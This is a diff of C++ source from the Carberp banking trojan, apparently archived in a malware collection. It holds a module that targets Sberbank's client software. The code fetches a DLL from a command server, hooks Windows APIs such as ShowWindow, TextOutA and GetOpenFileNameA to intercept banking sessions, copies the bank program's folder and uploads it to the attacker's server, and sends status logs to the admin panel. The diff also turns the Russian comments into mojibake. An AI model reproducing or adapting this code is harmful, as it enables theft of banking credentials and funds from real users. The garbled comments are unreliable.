@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "Modules.h"
 
 #ifdef SBERH
@@ -41,13 +52,13 @@ namespace SBER_DOWNLOAD_DLL
 
 //static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;
 
-//если DLL_FROM_DISK есть, то s.dll загружается на диск и запускается с диска
+//пїЅпїЅпїЅпїЅ DLL_FROM_DISK пїЅпїЅпїЅпїЅ, пїЅпїЅ s.dll пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 #define DLL_FROM_DISK
 
 namespace Sber
 {
 
-// Импорт из Sb.dll
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Sb.dll
 typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
 typedef VOID( WINAPI *PSetParams )		(char* AHost, char* AUid, char* AUser);
 typedef BOOL( WINAPI *PShowWindow )		( HWND hWnd, int nCmdShow );
@@ -80,7 +91,7 @@ typedef HMODULE ( WINAPI *PLoadLibraryExW )(LPCWSTR lpLibFileName, HANDLE hFile,
 typedef LSTATUS ( WINAPI *PRegQueryValueExA )(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved,
 									LPDWORD lpType,  LPBYTE lpData, LPDWORD lpcbData);
 
-// Храним адреса перехваченных функций
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static PShowWindow Real_ShowWindow;
 static PTranslateMessage Real_TranslateMessage;
 static PTextOutA Real_TextOutA;
@@ -97,11 +108,11 @@ static PGetOpenFileNameA Real_GetOpenFileNameA;
 static PLoadLibraryExW Real_LoadLibraryExW;
 static PRegQueryValueExA Real_RegQueryValueExA;
 
-char domain[128]; //адрес админки
-char azUser[128]; //имя юзера
+char domain[128]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+char azUser[128]; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 char botUid[128];
 
-//создает имя файла для хранения dll в файле
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll пїЅ пїЅпїЅпїЅпїЅпїЅ
 static PCHAR GetNameDll(char* uid)
 {
 	PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
@@ -111,7 +122,7 @@ static PCHAR GetNameDll(char* uid)
 		pPathAppendA( path, uid );
 		m_lstrcat( path, ".tmp" );
 		char* path2 = UIDCrypt::CryptFileName( path, false );
-		DBG( "Sber", "имя файла dll: %s", path2 );
+		DBG( "Sber", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ dll: %s", path2 );
 		HEAP::Free(path);
 		path = path2;
 	}
@@ -136,12 +147,12 @@ static void SendLogToAdmin( int num )
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
-	DBG( "Sber", "Отсылка лога: %s", qr );
+	DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ: %s", qr );
 	HTTPResponse::Clear(&Response);
 }
 
 
-//если есть DLL_FROM_DISK, то функция возвращает имя файла
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ DLL_FROM_DISK, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #ifdef DLL_FROM_DISK
 static char* LoadSluiceDll( char* uid )
 #else
@@ -154,14 +165,14 @@ static BYTE* LoadSluiceDll( char* uid )
 
 	BYTE* module = 0;
 	char* nameFile = GetNameDll(uid);
-	//формируем пароль из уида
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	char psw[9];
 	m_memcpy( psw, uid, 8 );
 	psw[8] = 0;
 
 	if(!HTTP::Get( url, (char**)&module, 0 ))
 	{
-		DBG( "Sber", "не удаеться скачать нужную длл, проверьте есть ли она по адресу %s", url );
+		DBG( "Sber", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", url );
 		if( nameFile )
 		{
 #ifdef DLL_FROM_DISK
@@ -187,7 +198,7 @@ static BYTE* LoadSluiceDll( char* uid )
 	{
 		int szModule = STR::Length((char*)module);
 		//File::WriteBufferA( "c:\\s.dll", module, szModule );
-		DBG( "Sber", "Загружен файл %s, размер: %d", url, szModule );
+		DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s, пїЅпїЅпїЅпїЅпїЅпїЅ: %d", url, szModule );
 		if( nameFile )
 		{
 #ifdef DLL_FROM_DISK
@@ -221,13 +232,13 @@ static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* na
 
 	if( !addrFunc )
 	{
-		DBG( "Sber", "в dll нет функции %s", nameDllFunc );
+		DBG( "Sber", "пїЅ dll пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", nameDllFunc );
 		return false;
 	}
 	if( HookApi( numHookDll, hashHookFunc, addrFunc, &realFunc ) )
 	{  
 		if( InitFunc( (DWORD)realFunc, (char*)nameHookFunc ) )
-			DBG( "Sber", "поставили хук из длл на %s", nameHookFunc );
+			DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ %s", nameHookFunc );
 		else
 			return false;
 	}	
@@ -259,10 +270,10 @@ static bool HookSberApi()
 #endif
 	if( hLib == NULL )
 	{	
-		DBG( "Sber", "не получилось загрузить библиотеку (MemoryLoadLibrary) err=%d", err );
+		DBG( "Sber", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (MemoryLoadLibrary) err=%d", err );
 		return false;
 	}
-	DBG( "Sber", "Библиотека загружена" );
+	DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 
 	char StartInitFunc_func[] = {'I','n','i','t','F','u','n','c',0};
 
@@ -273,7 +284,7 @@ static bool HookSberApi()
 #endif
 	if( pInitFunc == NULL )
 	{	
-		DBG( "Sber","в dll нет функции %s", StartInitFunc_func );
+		DBG( "Sber","пїЅ dll пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", StartInitFunc_func );
 		return 0;
 	}
 
@@ -284,7 +295,7 @@ static bool HookSberApi()
 #endif
 	if( SetParamsSBR == NULL )
 	{
-		DBG( "Sber", "в dll нет функции SetParams" );
+		DBG( "Sber", "пїЅ dll пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ SetParams" );
 		return 0;		
 	}
 	
@@ -294,9 +305,9 @@ static bool HookSberApi()
 	m_lstrcat( HostOfBots, domain );
 	string azUser = GetAzUser();
 	SetParamsSBR( HostOfBots, BOT_UID, azUser.t_str() );
-	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, BOT_UID );
+	DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s пїЅ UID %s", HostOfBots, BOT_UID );
 
-	//Подгружаем из длл хуки и устанавливаем
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TranslateHook( hLib, pInitFunc, "ShowWindowCallBack", "ShowWindow", DLL_USER32, 0x7506E960, Real_ShowWindow );
 	TranslateHook( hLib, pInitFunc, "TranslateMessageCallBack", "TranslateMessage", DLL_USER32, 0xC45D9631, Real_TranslateMessage );
 	TranslateHook( hLib, pInitFunc, "DrawTextACallBack", "DrawTextA", DLL_USER32, 0x85BBDFC, Real_DrawTextA );
@@ -313,7 +324,7 @@ static bool HookSberApi()
 	TranslateHook( hLib, pInitFunc, "LoadLibraryExWCallBack", "LoadLibraryExW", DLL_KERNEL32, 0x20088E7C, Real_LoadLibraryExW );
 	TranslateHook( hLib, pInitFunc, "RegQueryValueExACallBack", "RegQueryValueExA", DLL_ADVAPI32, 0x1802E7C8, Real_RegQueryValueExA );
 
-	DBG( "Sber", "Установка хуков выполнена" );
+	DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	SendLogToAdmin(3);
 
 	VideoProcess::RecordPID( 0, "Sber" );
@@ -323,65 +334,65 @@ static bool HookSberApi()
 	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\sbgrbd.bal" );
 	if( FileExistsA(path) )
 	{
-		DBG( "Sber", "Файл '%s' существует", path );
+		DBG( "Sber", "пїЅпїЅпїЅпїЅ '%s' пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", path );
 	}
 	else
 	{
-		DBG( "Sber", "Файл '%s' не существует", path );
+		DBG( "Sber", "пїЅпїЅпїЅпїЅ '%s' пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", path );
 		pPathRemoveFileSpecA(path);
 		pPathAppendA( path, "sb.bal" );
-		DBG( "Sber", "Создаем файл '%s'", path );
+		DBG( "Sber", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ '%s'", path );
 		File::WriteBufferA( path, path, 0 );
 	}
 	return true;
 }
 
-//непосредственное копирование папки сбера, сначала копирует во временную папку, а потом отсылает на сервер с временной папки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
 	BOT::Initialize(ProcessUnknown);
-	// При отправке данных сбера включаем режим Банк
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     SetBankingMode();
 
 
 	char folderTmp[MAX_PATH], pathFlag[MAX_PATH], pathForExe[MAX_PATH];
-	if( GetAllUsersProfile( folderTmp, sizeof(folderTmp), "sbe" ) && //путь к временной папке
+	if( GetAllUsersProfile( folderTmp, sizeof(folderTmp), "sbe" ) && //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
 		GetAllUsersProfile( pathFlag, sizeof(pathFlag), "sbef.dat" ) )
 	{
 		char flag = 0;
-		File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //говорим что идет процесс копирования
+		File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD sz = 0;
-		//путь к exe сбера
+		//пїЅпїЅпїЅпїЅ пїЅ exe пїЅпїЅпїЅпїЅпїЅ
 		char* folderPrg = (char*)File::ReadToBufferA( pathForExe, sz );
 		if( folderPrg )
 		{
-			pPathRemoveFileSpecA(folderPrg); //оставляем только папку
-			*((int*)&(folderPrg[ m_lstrlen(folderPrg) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+			pPathRemoveFileSpecA(folderPrg); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+			*((int*)&(folderPrg[ m_lstrlen(folderPrg) ])) = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2-пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "\0\0"
 			*((int*)&(folderTmp[ m_lstrlen(folderTmp) ])) = 0; 
-			//если папка, куда хотим временно перенести папку сбера, есть, то удаляем ее
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 			if( Directory::IsExists(folderTmp) ) DeleteFolders(folderTmp);
 			pCreateDirectoryA( folderTmp, 0 );
-			DBG( "SBER", "Копирование во временную папку %s", folderTmp );
+			DBG( "SBER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderTmp );
 			if( CopyFileANdFolder( folderPrg, folderTmp ) )
 			{
-				DBG( "SBER", "Копирование на сервер" );
+				DBG( "SBER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 				VideoProcess::SendFiles( 0, "sber", folderTmp );
 				DeleteFolders(folderTmp);
 			}
 			flag = 1;
-			File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //говорим что процесс копирования окончен
+			File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			MemFree(folderPrg);
 			pDeleteFileA(pathForExe);
-			DBG( "SBER", "Копирование закончено" );
+			DBG( "SBER", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		}
 	}
 	return 0;
 }
 
-//запуск svchost.exe для копирования папки программы,
-//appName - путь к exe сбербанка (wclnt.exe),
-//force - true, если нужно произвести повторное копирование, false - если копирование уже было, то повторно не будет копировать
+//пїЅпїЅпїЅпїЅпїЅпїЅ svchost.exe пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+//appName - пїЅпїЅпїЅпїЅ пїЅ exe пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (wclnt.exe),
+//force - true, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, false - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void StartCopyFolder( const char* appName, bool force )
 {
 	char pathForExe[MAX_PATH], pathFlag[MAX_PATH];
@@ -393,26 +404,26 @@ static void StartCopyFolder( const char* appName, bool force )
 		{
 			DWORD sz;
 			char* data = (char*)File::ReadToBufferA( pathFlag, sz );
-			if( data[1] == 0 ) //идет копирование
+			if( data[1] == 0 ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				run = false;
-			else //уже было скопировано
-				if( !force ) //повторное копирование не нужно
+			else //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				if( !force ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					run = false;
 			MemFree(data);
 		}
 		if( run )
 		{
-			DBG( "SBER", "Запуск копирования папки" );
-			//сохраняем путь к exe относительно которого будем определять папку сбербанка
+			DBG( "SBER", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ exe пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			File::WriteBufferA( pathForExe, (void*)appName, m_lstrlen(appName) ); 
 			MegaJump(CopyFolderThread);
 		}
 		else
-			DBG( "SBER", "Уже было скопировано, повторно не нужно" );
+			DBG( "SBER", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 	}
 }
 
-//запуск копирования по версии программы
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void CopyFolderForVersion( const char* appName )
 {
 	int size = (int)pGetFileVersionInfoSizeA( appName, 0 );
@@ -430,7 +441,7 @@ static void CopyFolderForVersion( const char* appName )
 			pVerQueryValueA( data, keyVer, (void**)&valVer, &size );
 			if( size > 0 )
 			{
-				DBG( "SBER", "Версия программы %s", valVer );
+				DBG( "SBER", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", valVer );
 				if( m_memcmp( valVer, "7.17", 4 ) == 0 ) //"7.12.5.2225" ) == 0 ) 
 				{
 					StartCopyFolder( appName, false );
@@ -441,7 +452,7 @@ static void CopyFolderForVersion( const char* appName )
 	}
 }
 
-//инициализирует глобальные переменные 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 static bool SberInitData()
 {
 	if( SberGetAdminUrl(domain) == 0 ) return false;
@@ -466,7 +477,7 @@ bool Init( const char* appName, DWORD appHash )
 	return false;
 }
 
-//возвращает папку в которой находится сбер
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 static char* GetPathSber( char* path )
 {
 	char* s = Registry::GetStringValue( HKEY_LOCAL_MACHINE, "SOFTWARE\\SBRF\\WCLNT", "Install_0" );
@@ -474,7 +485,7 @@ static char* GetPathSber( char* path )
 	{
 		m_lstrcpy( path, s );
 		STR::Free(s);
-		DBG( "Sber", "Путь к сберу '%s'", path );
+		DBG( "Sber", "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ '%s'", path );
 		return path;
 	}
 	path[0]= 0;
@@ -494,7 +505,7 @@ bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 }
 
 
-// Функция отправляет лог в отдельном потоке
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI SendLogToAdminThread( LPVOID num )
 {
 	if (Sber::SberInitData())
@@ -502,7 +513,7 @@ static DWORD WINAPI SendLogToAdminThread( LPVOID num )
 	return 0;
 }
 
-//отсылает в лог 0, если есть в реестре ветка сбера
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ 0, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 void SendLogIfReestr()
 {
 	char path[MAX_PATH];
